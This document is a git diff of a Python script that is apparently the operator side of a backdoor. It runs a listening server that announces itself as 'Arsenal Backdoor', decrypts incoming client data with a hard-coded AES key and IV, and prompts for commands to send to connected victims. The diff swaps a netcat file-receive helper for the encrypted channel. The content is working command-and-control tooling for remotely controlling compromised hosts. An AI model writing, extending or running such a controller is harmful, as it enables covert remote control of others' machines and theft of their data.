@@ -1,6 +1,8 @@
 #!/usr/bin/python3
-import socket, sys, os, argparse, subprocess, struct
+import socket, sys, os, argparse, subprocess
+from struct import unpack
 from _thread import start_new_thread
+from Crypto.Cipher import AES
 parser = argparse.ArgumentParser(description='q*bert says goodbye')
 parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
 parser.add_argument('-s', dest='host', help='Hosting IP')
@@ -9,11 +11,10 @@ args = parser.parse_args()
 if args.host is None:
     args.host = '0.0.0.0'
 
-def get_file(filename):
-    command = ["/bin/nc", "-lp", "12"]
-    output = subprocess.run(command, stdout=subprocess.PIPE)
-    with open(filename, 'wb') as f:
-        f.write(output.stdout)
+def do_decrypt(ciphertext):
+    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    message = obj2.decrypt(ciphertext)
+    return message
 
 def client(conn, addr, buff):
     conn.send(b'Arsenal Backdoor\n')
@@ -25,7 +26,7 @@ def client(conn, addr, buff):
         while len(data) < length:
             to_read = length - len(data)
             data += conn.recv(buff if to_read > buff else to_read)
-        print(addr[0]+':\n'+str(data, 'utf-8'))
+        print(addr[0]+':\n'+str(do_decrypt(data), 'utf-8'))
         while True:
             try:
                 reply='cmd ' + input('Enter command for %s: ' %addr[0])
